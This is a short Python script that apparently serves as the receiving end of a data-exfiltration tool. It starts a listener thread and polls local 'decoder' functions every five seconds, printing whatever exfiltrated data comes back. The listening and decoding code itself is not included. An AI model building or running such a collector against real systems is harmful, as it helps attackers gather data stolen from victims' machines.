#!/usr/bin/env python3

import decoder, listener
import threading
from time import sleep

def listen():
    listener.start_listener()

def exfil():
    decoder.read_log()
    return decoder.read_exfil()

# if __name__=="__main__":
t1 = threading.Thread(target=listen)
t1.start()
sleep(1)
# t2 = threading.Thread(target=read_exfil)
while True:
    exfil_data = str(exfil())
    if(len(exfil_data) != 0):
        print(exfil_data)
    sleep(5)